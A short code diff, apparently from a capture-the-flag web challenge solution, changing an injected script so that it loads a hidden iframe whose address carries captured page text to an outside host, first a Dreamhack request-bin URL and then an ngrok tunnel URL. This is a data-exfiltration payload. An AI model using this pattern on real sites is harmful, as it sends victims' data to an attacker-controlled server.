@@ -18,7 +18,7 @@
                         text = error
                     }
                 
-                  iframe.src = "https://gjiuwez.request.dreamhack.games/" + text
+                  iframe.src = "http://nonspirited-zoie-bilocular.ngrok-free.dev/" + text
                   document.body.append(iframe)
               }
           </script>
